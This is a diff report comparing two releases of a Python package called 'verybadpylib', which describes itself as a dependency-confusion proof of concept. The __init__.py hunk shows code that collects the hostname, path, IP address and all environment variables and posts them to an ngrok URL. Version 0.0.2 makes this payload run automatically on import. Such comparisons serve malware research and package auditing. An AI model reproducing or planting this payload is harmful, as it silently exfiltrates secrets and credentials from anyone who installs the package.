# Comparing `tmp/verybadpylib-0.0.1.tar.gz` & `tmp/verybadpylib-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "verybadpylib-0.0.1.tar", last modified: Tue Aug  1 08:57:17 2023, max compression
+gzip compressed data, was "verybadpylib-0.0.2.tar", last modified: Tue Aug  1 11:23:55 2023, max compression
```

## Comparing `verybadpylib-0.0.1.tar` & `verybadpylib-0.0.2.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-08-01 08:57:17.615576 verybadpylib-0.0.1/
--rw-r--r--   0 kali      (1000) kali      (1000)      268 2023-08-01 08:57:17.615576 verybadpylib-0.0.1/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)       92 2023-08-01 08:56:49.000000 verybadpylib-0.0.1/README.md
--rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-08-01 08:57:17.615576 verybadpylib-0.0.1/setup.cfg
--rw-r--r--   0 kali      (1000) kali      (1000)      753 2023-08-01 08:56:23.000000 verybadpylib-0.0.1/setup.py
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-08-01 08:57:17.615576 verybadpylib-0.0.1/verybadpylib/
--rw-r--r--   0 kali      (1000) kali      (1000)      761 2023-08-01 08:53:47.000000 verybadpylib-0.0.1/verybadpylib/__init__.py
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-08-01 08:57:17.615576 verybadpylib-0.0.1/verybadpylib.egg-info/
--rw-r--r--   0 kali      (1000) kali      (1000)      268 2023-08-01 08:57:17.000000 verybadpylib-0.0.1/verybadpylib.egg-info/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)      222 2023-08-01 08:57:17.000000 verybadpylib-0.0.1/verybadpylib.egg-info/SOURCES.txt
--rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-08-01 08:57:17.000000 verybadpylib-0.0.1/verybadpylib.egg-info/dependency_links.txt
--rw-r--r--   0 kali      (1000) kali      (1000)        9 2023-08-01 08:57:17.000000 verybadpylib-0.0.1/verybadpylib.egg-info/requires.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       13 2023-08-01 08:57:17.000000 verybadpylib-0.0.1/verybadpylib.egg-info/top_level.txt
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-08-01 11:23:55.831442 verybadpylib-0.0.2/
+-rw-r--r--   0 kali      (1000) kali      (1000)      229 2023-08-01 11:23:55.831442 verybadpylib-0.0.2/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)       58 2023-08-01 09:23:40.000000 verybadpylib-0.0.2/README.md
+-rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-08-01 11:23:55.831442 verybadpylib-0.0.2/setup.cfg
+-rw-r--r--   0 kali      (1000) kali      (1000)      646 2023-08-01 11:23:05.000000 verybadpylib-0.0.2/setup.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-08-01 11:23:55.827442 verybadpylib-0.0.2/verybadpylib/
+-rw-r--r--   0 kali      (1000) kali      (1000)      740 2023-08-01 09:35:29.000000 verybadpylib-0.0.2/verybadpylib/__init__.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-08-01 11:23:55.831442 verybadpylib-0.0.2/verybadpylib.egg-info/
+-rw-r--r--   0 kali      (1000) kali      (1000)      229 2023-08-01 11:23:55.000000 verybadpylib-0.0.2/verybadpylib.egg-info/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)      222 2023-08-01 11:23:55.000000 verybadpylib-0.0.2/verybadpylib.egg-info/SOURCES.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-08-01 11:23:55.000000 verybadpylib-0.0.2/verybadpylib.egg-info/dependency_links.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)        9 2023-08-01 11:23:55.000000 verybadpylib-0.0.2/verybadpylib.egg-info/requires.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       13 2023-08-01 11:23:55.000000 verybadpylib-0.0.2/verybadpylib.egg-info/top_level.txt
```

### Comparing `verybadpylib-0.0.1/setup.py` & `verybadpylib-0.0.2/setup.py`

 * *Files 24% similar despite different names*

```diff
@@ -3,19 +3,18 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.0.1'
-DESCRIPTION = 'Dependency confiuse Attack'
-LONG_DESCRIPTION = 'Python package dependency confiuse vulnerability POC. Impact this vulnerability is Remote code execution (RCE)'
+VERSION = '0.0.2'
+DESCRIPTION = 'NOT A NORMAL package!'
+LONG_DESCRIPTION = 'NOT A NORMAL package!'
 
-# Setting up
 setup(
     name="verybadpylib",
     version=VERSION,
     author="test",
     author_email="test@test.com",
     description=DESCRIPTION,
     long_description_content_type="text/markdown",
```

### Comparing `verybadpylib-0.0.1/verybadpylib/__init__.py` & `verybadpylib-0.0.2/verybadpylib/__init__.py`

 * *Files 13% similar despite different names*

```diff
@@ -21,9 +21,9 @@
         'hostname': socket.gethostname(),
         'path': os.path.abspath('.'),
         'env': dict(os.environ),
         'ip': ip,
     }
     post_data("https://6987-2001-1ab8-1-8-298f-64f2-709f-fb75.ngrok-free.app/", data)
 
-if __name__ == "__main__":
-    run_payload()
+data = {}
+run_payload()
```

